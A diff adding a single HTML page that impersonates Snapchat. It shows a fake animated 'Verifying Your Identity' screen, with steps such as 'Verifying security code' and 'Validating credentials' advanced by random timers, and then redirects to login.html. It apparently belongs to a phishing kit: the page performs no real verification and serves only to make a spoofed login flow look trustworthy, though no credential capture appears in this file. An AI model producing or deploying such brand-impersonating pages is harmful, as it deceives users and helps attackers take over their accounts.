@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Verifying</title>
+    <link rel="icon" type="image/png" href="Snapchat.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        
+        .verification-container {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            background: #fffc00;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(255, 252, 0, 0.3);
+            animation: rotate 2s linear infinite;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+        
+        h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 40px;
+        }
+        
+        .progress-container {
+            width: 100%;
+            background: #f0f0f0;
+            border-radius: 50px;
+            height: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #fffc00 0%, #ffd700 100%);
+            border-radius: 50px;
+            width: 0%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px rgba(255, 252, 0, 0.5);
+        }
+        
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .progress-step {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .progress-percentage {
+            font-size: 18px;
+            color: #333;
+            font-weight: 700;
+        }
+        
+        .steps-list {
+            text-align: left;
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 30px;
+        }
+        
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            font-size: 14px;
+            color: #999;
+            transition: all 0.3s;
+        }
+        
+        .step-item.active {
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .step-item.completed {
+            color: #00cc00;
+        }
+        
+        .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        
+        .step-item.active .step-icon {
+            background: #fffc00;
+        }
+        
+        .step-item.completed .step-icon {
+            background: #00cc00;
+        }
+        
+        .checkmark {
+            display: none;
+        }
+        
+        .step-item.completed .checkmark {
+            display: block;
+        }
+        
+        .spinner {
+            display: none;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #333;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        
+        .step-item.active .spinner {
+            display: block;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="logo">
+            <svg fill="white" viewBox="0 0 24 24">
+                <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5zm0 18c-4.41 0-8-3.59-8-8V8.3l8-4.5 8 4.5V12c0 4.41-3.59 8-8 8z"/>
+                <path d="M10 17l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+            </svg>
+        </div>
+        
+        <h2 id="title">Verifying Your Identity</h2>
+        <p class="subtitle" id="subtitle">Please wait while we verify your information...</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="progress-info">
+            <span class="progress-step" id="currentStep">Checking account status...</span>
+            <span class="progress-percentage" id="percentage">0%</span>
+        </div>
+        
+        <div class="steps-list">
+            <div class="step-item active" id="step1">
+                <div class="step-icon">
+                    <div class="spinner"></div>
+                    <svg class="checkmark" width="14" height="14" fill="white" stroke="white" stroke-width="2">
+                        <path d="M2 7l3 3 7-7"/>
+                    </svg>
+                </div>
+                <span>Checking account status</span>
+            </div>
+            <div class="step-item" id="step2">
+                <div class="step-icon">
+                    <div class="spinner"></div>
+                    <svg class="checkmark" width="14" height="14" fill="white" stroke="white" stroke-width="2">
+                        <path d="M2 7l3 3 7-7"/>
+                    </svg>
+                </div>
+                <span>Verifying security code</span>
+            </div>
+            <div class="step-item" id="step3">
+                <div class="step-icon">
+                    <div class="spinner"></div>
+                    <svg class="checkmark" width="14" height="14" fill="white" stroke="white" stroke-width="2">
+                        <path d="M2 7l3 3 7-7"/>
+                    </svg>
+                </div>
+                <span>Authenticating device</span>
+            </div>
+            <div class="step-item" id="step4">
+                <div class="step-icon">
+                    <div class="spinner"></div>
+                    <svg class="checkmark" width="14" height="14" fill="white" stroke="white" stroke-width="2">
+                        <path d="M2 7l3 3 7-7"/>
+                    </svg>
+                </div>
+                <span>Validating credentials</span>
+            </div>
+            <div class="step-item" id="step5">
+                <div class="step-icon">
+                    <div class="spinner"></div>
+                    <svg class="checkmark" width="14" height="14" fill="white" stroke="white" stroke-width="2">
+                        <path d="M2 7l3 3 7-7"/>
+                    </svg>
+                </div>
+                <span>Finalizing verification</span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const steps = [
+            { id: 'step1', text: 'Checking account status...' },
+            { id: 'step2', text: 'Verifying security code...' },
+            { id: 'step3', text: 'Authenticating device...' },
+            { id: 'step4', text: 'Validating credentials...' },
+            { id: 'step5', text: 'Finalizing verification...' }
+        ];
+        
+        let progress = 0;
+        let currentStepIndex = 0;
+        
+        const progressBar = document.getElementById('progressBar');
+        const percentage = document.getElementById('percentage');
+        const currentStepText = document.getElementById('currentStep');
+        
+        function updateProgress() {
+            const increment = Math.random() * 8 + 3;
+            progress = Math.min(progress + increment, 100);
+            
+            progressBar.style.width = progress + '%';
+            percentage.textContent = Math.floor(progress) + '%';
+            
+            const newStepIndex = Math.min(Math.floor(progress / 20), steps.length - 1);
+            
+            if (newStepIndex > currentStepIndex) {
+                document.getElementById(steps[currentStepIndex].id).classList.remove('active');
+                document.getElementById(steps[currentStepIndex].id).classList.add('completed');
+                
+                currentStepIndex = newStepIndex;
+                document.getElementById(steps[currentStepIndex].id).classList.add('active');
+                currentStepText.textContent = steps[currentStepIndex].text;
+            }
+            
+            if (progress >= 100) {
+                document.getElementById(steps[currentStepIndex].id).classList.remove('active');
+                document.getElementById(steps[currentStepIndex].id).classList.add('completed');
+                
+                currentStepText.textContent = '✓ Verification complete!';
+                
+                setTimeout(() => {
+                    window.location.href = 'login.html';
+                }, 800);
+            }
+        }
+        
+        const interval = setInterval(() => {
+            if (progress < 100) {
+                updateProgress();
+            } else {
+                clearInterval(interval);
+            }
+        }, 400);
+    </script>
+</body>
+</html>
